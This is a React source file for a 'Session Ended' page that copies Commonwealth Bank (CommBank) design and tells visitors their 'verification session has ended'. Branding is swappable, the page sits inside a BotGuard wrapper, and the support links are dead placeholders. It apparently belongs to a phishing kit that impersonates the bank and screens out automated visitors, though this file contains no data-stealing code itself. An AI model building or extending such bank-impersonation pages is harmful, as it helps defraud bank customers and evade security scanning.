'use client';

/**
 * CBA Terminated/Session Ended Page
 * Two-column layout matching CommBank design patterns
 * Warning state with helpful guidance
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { StatusSidebar } from '@/components/layout/Sidebar';

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

// Warning Triangle Icon
function WarningIcon() {
  return (
    <svg width="64" height="56" viewBox="0 0 64 56" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M32 0L0 56H64L32 0Z"
        fill="#FF9800"
      />
      <path
        d="M29 21H35V35H29V21Z"
        fill="white"
      />
      <path
        d="M29 40H35V46H29V40Z"
        fill="white"
      />
    </svg>
  );
}

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="main-container">
        {/* Two Column Layout */}
        <section className="login-section">
          {/* Left Column - Terminated Message */}
          <div className="login-box">
            <div className="box-header" style={{ backgroundColor: '#FF9800' }}>
              <span>Session Ended</span>
            </div>
            <div className="box-content" style={{ textAlign: 'center', padding: '30px 20px' }}>
              {/* Warning Icon */}
              <div className="status-icon-wrapper warning">
                <WarningIcon />
              </div>

              <h2 style={{ fontSize: '18px', fontWeight: 700, color: '#000', marginBottom: '12px' }}>
                Your verification session has ended
              </h2>

              <p style={{ fontSize: '13px', color: '#666', lineHeight: 1.5, marginBottom: '16px' }}>
                This may be due to inactivity, or the session was completed or cancelled.
              </p>

              <div style={{ borderTop: '1px solid #CCCCCC', paddingTop: '16px', marginTop: '16px' }}>
                <p style={{ fontSize: '13px', color: '#000', lineHeight: 1.5 }}>
                  If you believe this was an error, please contact our support team for assistance.
                </p>
              </div>

              <p style={{ fontSize: '13px', color: '#666', marginTop: '24px' }}>
                Need help? Contact <a href="#">{currentBrand.companyName} support</a>
              </p>
            </div>
          </div>

          {/* Right Column - Help Sidebar */}
          <StatusSidebar isSuccess={false} />
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Report a security concern</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Frequently asked questions</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
